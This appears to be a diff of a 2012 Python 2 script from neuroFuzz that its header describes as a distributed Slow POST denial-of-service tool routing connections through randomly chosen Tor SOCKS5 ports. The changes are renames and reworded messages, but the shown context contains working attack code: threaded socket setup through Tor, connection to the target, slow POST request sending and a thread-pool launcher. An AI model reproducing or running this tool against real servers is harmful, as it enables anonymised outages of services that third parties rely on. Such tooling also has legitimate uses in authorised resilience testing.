@@ -3,8 +3,8 @@
     Company: neuroFuzz, LLC
     Date: 10/10/2012
     Prog to perform a distributed Slow POST DoS attack
-    against a given target web server over random SOCKS5
-    sockets leveraging tor
+    against a given target web server across multiple
+    randomly chosen SOCKS5 sockets leveraging tor
 
     MIT-LICENSE
     Copyright (c) 2012 Andres Andreu, neuroFuzz LLC
@@ -59,11 +59,11 @@ class httpPost(Thread):
         self.stopped = False
         self.sleepRange = [5, 30]
         self.choicePool = ''.join(map(chr, range(48, 58)) + map(chr, range(65, 91)) + map(chr, range(97, 123)))
-        self.portlist = []
+        self.torportlist = []
         Thread.__init__(self)
 
-    def setPortList(self, plist=[]):
-        self.portlist = plist
+    def setTorPortList(self, plist=[]):
+        self.torportlist = plist
         
     def setHost(self, val=""):
         self.host = val
@@ -80,7 +80,7 @@ class httpPost(Thread):
             while not self.stopped:
                 try:
                     s = socks.socksocket()
-                    s.setproxy(socks.PROXY_TYPE_SOCKS5, self.torip, int(choice(self.portlist)))
+                    s.setproxy(socks.PROXY_TYPE_SOCKS5, self.torip, int(choice(self.torportlist)))
                     s.connect((self.host, self.port))
                     s.settimeout(1)
                     s.send("POST %s HTTP/1.1\r\n"
@@ -126,14 +126,14 @@ def kickOff(host="", port="", plist=[]) :
     try:
         for i in range(1, threads):
             t = httpPost(host, port, sleepTime)
-            t.setPortList(plist=plist)
+            t.setTorPortList(plist=plist)
             tpool.append(t)
             t.start()
         while True:
             sleep(choice(range(1,10)))
 
     except KeyboardInterrupt, e:
-        print "\nCaught keyboard interrupt. Stopping all threads"
+        print "\nKeyboard Interruption ... stopping all threads"
         for h in tpool:
             h.stop()
         for h in tpool:
